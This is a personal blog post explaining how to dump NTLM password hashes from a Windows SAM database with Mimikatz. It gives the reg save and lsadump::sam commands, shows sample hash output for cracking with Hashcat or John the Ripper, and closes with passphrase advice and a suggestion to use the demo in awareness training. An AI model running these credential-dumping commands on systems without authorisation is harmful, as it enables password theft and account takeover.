---
author: Josh
date: 2020-11-23
layout: post
title: "Dumping NTLM Hashes from SAM using Mimikatz"
image: https://joshdawes.com/images/2020-11/mimikatz.png
description: Mimikatz is a tool that can allow you to extract all kinds of Windows secrets. In this post I will show you how to dump password hashes from a SAM database.
permalink: /dumping-ntlm-hashes-from-sam-using-mimikatz/
---

![image](/images/2020-11/mimikatz.png){: .center-image }

<strong>TL;DR:<strong>```lsadump::sam /system:SYSTEM /sam:SAM```

Previously I had written a blog post on [Dumping NTLM Hashes](https://joshdawes.com/dumping-ntlm-hashes/){:target="_blank"}
 with SamDump2. This method does not work for PCs running Windows 10 1607 or newer. I found this [great write up](https://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/){:target="_blank"} explaining what changed with 1607. 

With these changes, different methods are required to dump NTLM hashes. One of these methods is to use Mimikatz. Mimikatz is a tool that can allow you to extract all kinds of Windows secrets. In this post I will show you how to dump password hashes from a previously acquired SAM (Security Account Manager) database. You will also need to acquire the SYSTEM database so Mimikatz can use the SysKey to decrypt the SAM database. The SAM and SYSTEM databsases are located in:

```
C:\Windows\system32\config\
```

# Prerequisites

Download [Mimikatz](https://github.com/gentilkiwi/mimikatz){:target="_blank"} and extract to C:\mimikatz_trunk

Save your SAM and SYSTEM databases in the Mimikatz directory. i.e. C:\mimikatz_trunk\x64

# Saving SAM and SYSTEM Databases

To quickly get a SAM and SYSTEM database run the following commands:

```
reg save HKLM\SAM c:\mimikatz_trunk\x64\SAM
reg save HKLM\SYSTEM c:\mimikatz_trunk\x64\SYSTEM
```

Note: You will be required to have administrator access to run these commands and the directory must already exist. 


# Dumping Hashes
Now that you have Mimikatz, the SAM database, and the SYSTEM database in the same directory, double click on mimikatz.exe. 

You will be presented with the mimikatz command line. The first command you’ll want to run is the log command. This will allow you to save the output of what you are doing to a file for later reference. Start logging with the following command:

```
log mimikatz.log
```

The log file will save in the current directory. 

You can now run the command to dump the hashes from the SAM database. This will be conveniently written to your log file.

```
lsadump::sam /system:SYSTEM /sam:SAM
```

The hashes will also appear on the screen. Type <strong>exit</strong> to close Mimikatz.

# Finding your Hashes

Now that you have dumped the hashes you can check your log file to view them. They will look something like this:

```
RID  : 000003ea (1002) 

User : User1 

  Hash NTLM: 0ea0e4bb502bd4acaf6997d7c26b54d1 

  

RID  : 000003eb (1003) 

User : User2 

  Hash NTLM: 326f5f6c590b925012b8930758b42148 

  

RID  : 000003ec (1004) 

User : User3 

  Hash NTLM: 1337bdd3c9fa21e8d72849e1618d2535 

   

RID  : 000003ed (1005) 

User : User4 

  Hash NTLM: 9ad1180ec59ccbca760e6de738fb4d70 

  

RID  : 000003ee (1006) 

User : User5 

  Hash NTLM: 6b56ad7d13656b993ded0758f58794f6
```

Copy the <strong>Hash NTLM</strong> string into another text file so you have a text file that looks like the one below.

```
0ea0e4bb502bd4acaf6997d7c26b54d1 
326f5f6c590b925012b8930758b42148 
1337bdd3c9fa21e8d72849e1618d2535 
9ad1180ec59ccbca760e6de738fb4d70 
6b56ad7d13656b993ded0758f58794f6
```

These hashes can then be loaded into Hashcat or John the Ripper to attempt to crack the password.

# Creating a Stronger Password

It is not practical to have a 30-character randomly generated string of characters for your Windows password. Typing this in every time you came back to your desk would be tedious and it would be somewhat impossible for most people to remember. Could you imagine typing in <strong>@nZYf6S%&zZUjf4)YXc9=Y}7Yg{gPB</strong> every time you sat down at your desk? 

Users tend to go with something that is easy to type and easy to remember. i.e. a single word with a capital letter at the beginning and a number at the end, i.e. Summer2020.

Unfortunately, these simple passwords can be cracked very quickly. 

I recommend using a passphrase. A passphrase, while still a password, is multiple words put together which makes it harder for an attacker to crack but should still be reasonably simple to remember after a few days of logging in. It is best to create a passphrase using [diceware](https://theworld.com/~reinhold/diceware.html){:target="_blank"}.

An example diceware password is: <strong>preacherherringcirclelumpiness</strong> 

Of course, you will still need to add some uppercase letters, lowercase letters, symbols, and numbers to meet password requirements. Leaving you with something like:<br><strong>124/Preacher/Herring/Circle/Lumpiness</strong> 

Both Samsung and Apple have built in password managers that you could use to store the passphrase until you remember it.

# Conclusion

Running a simple password dump and cracking the hashes during user awareness training is a great way to highlight how easily a weak password can be exploited. Users can see in real time how quickly an attacker could crack their password, and you can show how quickly an attacker can pivot from there.
